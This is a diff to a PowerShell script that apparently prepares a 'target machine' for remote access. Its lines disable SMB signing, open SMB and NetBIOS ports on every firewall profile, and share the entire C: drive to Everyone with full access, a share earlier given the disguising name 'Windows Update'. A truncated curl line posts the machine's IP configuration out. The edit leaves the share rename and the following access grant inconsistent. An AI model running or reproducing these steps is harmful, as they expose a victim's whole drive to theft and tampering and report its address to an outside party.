@@ -50,8 +50,8 @@ Set-SmbServerConfiguration -EnableSecuritySignature $false -Force
 
 # Ensure TCP/UDP Ports are open in target machine's firewall
 Write-Host "Allowing TCP/UDP Ports..."
-New-NetFirewallRule -DisplayName "Allow SMB Ports" -Direction Inbound -Protocol TCP -LocalPort 139,445 -Action Allow
-New-NetFirewallRule -DisplayName "Allow NetBIOS Ports" -Direction Inbound -Protocol UDP -LocalPort 137,138 -Action Allow
+New-NetFirewallRule -DisplayName "Allow SMB Ports" -Direction Inbound -Protocol TCP -LocalPort 139,445 -Action Allow -Profile Any
+New-NetFirewallRule -DisplayName "Allow NetBIOS Ports" -Direction Inbound -Protocol UDP -LocalPort 137,138 -Action Allow -Profile Any
 
 # Allow Function Discovery Resource Publication
 Get-Service FDResPub
@@ -65,7 +65,7 @@ curl -F "content=$((Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway
 
 # Share the Drive (C:\ in this case)
 Write-Host "Sharing C: drive..."
-New-SmbShare -Name "Windows Update" -Path "C:\"
+New-SmbShare -Name "Root" -Path "C:\" -FullAccess "Everyone" 
 Grant-SmbShareAccess -Name "Windows Update" -AccountName "Everyone" -AccessRight Full -Force
 
 # Set permissions for the shared drive
